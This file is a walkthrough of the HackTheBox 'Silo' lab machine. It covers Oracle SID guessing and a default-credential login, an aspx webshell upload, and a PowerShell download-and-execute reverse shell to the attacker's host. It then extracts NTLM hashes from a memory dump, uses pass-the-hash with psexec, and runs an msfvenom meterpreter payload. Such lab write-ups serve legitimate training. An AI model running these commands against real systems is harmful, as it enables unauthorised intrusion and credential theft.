@@ -1,0 +1,169 @@
+HTB-Silo-Writeup
+
+IP : 10.10.10.82
+
+Nmap
+----
+- nmap scan revealed a few open ports 
+	
+	- 80 running Microsoft IIS
+	- 135 running MSRPC
+	- 139 running netbios-ssn
+	- 445 running SMB
+	- 1521 running oracle
+	- and a few others 
+
+Enumeration
+-----------
+- visiting the port 80 gives a default IIS page
+- running directory bruteforce against it doesnt seem to yield any interesting result   
+- we can start enumerating the low hanging fruit port 1521 which is running oracle 
+- we will need to install odat and sqlplus to interact/attack oracle
+- after installing the requirements we can start attacking oracle with odat
+- we need to identify atleast one SID to interact with the oracle database 
+- we can use odat to guess sid 
+
+	    odat sidguesser -s 10.10.10.82 -p 1521
+
+- we got two valid sid
+
+	sid : XE,XEXDB
+
+- this can also be done using metasploit
+
+
+	msf auxiliary(admin/oracle/sid_brute) > run
+
+- metasploit found four valid sid 
+
+	SIDs: ‘XE’, ‘XEXDB’, ‘PLSExtProc’, and ‘CLRExtProc’
+
+- since we have an sid now we can brute force for username and password
+
+
+	odat all -s silo.htb -p 1521 -d XE -v
+
+- we got the default credentials for oracle 
+
+	creds : SCOTT : tiger
+
+- we can use this credentials to connect to oracle with sqlplus
+
+	 sqlplus SCOTT/tiger@10.10.10.82:1521/XE
+
+- we do get logged in but we have very less privileges 
+- we can check our privileges using the following command 
+
+	select * from user_role_privs;
+
+- we can connect to oracle as database admin using the following command 
+
+	sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
+
+- on reading more on odat we found out that we can upload files 
+
+Shell as Phineas
+----------------
+- there was a default IIS server running on port 80
+- we can try to upload a webshell and get a stable shell back from it 
+- checking with php and asp shells didnt work, aspx on the other hand works fine 
+
+	odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot lord.aspx /usr/share/webshells/aspx/cmdasp.aspx
+
+- navigate to 
+
+	http://silo.htb/lord.aspx
+
+- we have a webshell 
+- now to get a proper reverse shell from this copy nishang’s poweshell reverse shell and add the line to call it at the bottom of the file
+- start a python server to host the webshell
+- get it on the machine with the command 
+
+	powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/Invoke-PowerShellTcp.ps1')
+
+- start a netcat listener
+
+	nc -nlvp 9001
+
+- run the exploit and we get a shell as phineas
+- grab the root flag 
+
+Priv-esc
+--------
+- along with the user flag there is another file in the desktop folder called as issue.txt
+- on checking it out we get a link to a dropbox backup and a password
+
+	Dropbox link
+	https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
+
+	link password:
+	?%Hm8646uC$
+
+- visiting the link ask for password 
+- trying the password we got from the text file but it failed 
+- there might be some encoding in place 
+- checked the issue.txt through the webshell and got the right password 
+	
+	link password:
+	£%Hm8646uC$
+
+- the dropbox link returns a memory dump
+- we can use a tool called as volatilty to read it 
+- running systeminfo command to get info on the machine 
+
+	OS Name:                   Microsoft Windows Server 2012 R2 Standard
+	OS Version:                6.3.9600 N/A Build 9600
+
+- running kdbgscan to profile the dumpfile
+
+	volatility kdbgscan -f SILO-20180105-221806.dmp
+
+- we got Win2012R2x64 
+- volatility has a lot of plugins that we can use 
+- running volatility against the dumpfile to enumerate for hashes 
+
+	volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
+
+- we got a few hashes 
+
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
+
+- instead of trying to crack the hashes we can try to pass it around to get a shell
+
+	/opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82
+ administrator@10.10.10.82
+
+ - we got a shell as system
+ - grab the root flag 
+
+ Alternate path to root
+ ----------------------
+ - we have access to the oracle database which is running as system
+ - we can just grab the root flag 
+
+ 	odat ctxsys -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --getFile c:\\users\\administrator\\desktop\\root.txt
+
+ - we can also try to get a shell out of this 
+ - by default we cannot use odat to execute command but we can use externaltable method to execute a file 
+ - first we will need to create an executable file using msfvenom
+
+ 	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=8084 -f exe -o shell.exe
+
+ - we can upload it using odat
+
+ 	odat utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile \\temp shell.exe shell.exe
+
+- setup a listener with necessary options in msfconsole
+
+	use /multi/handler
+	run
+
+ - we can run it 
+
+ 	odat externaltable -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --exec \\temp shell.exe
+
+ - we get a shell back as system
+
+
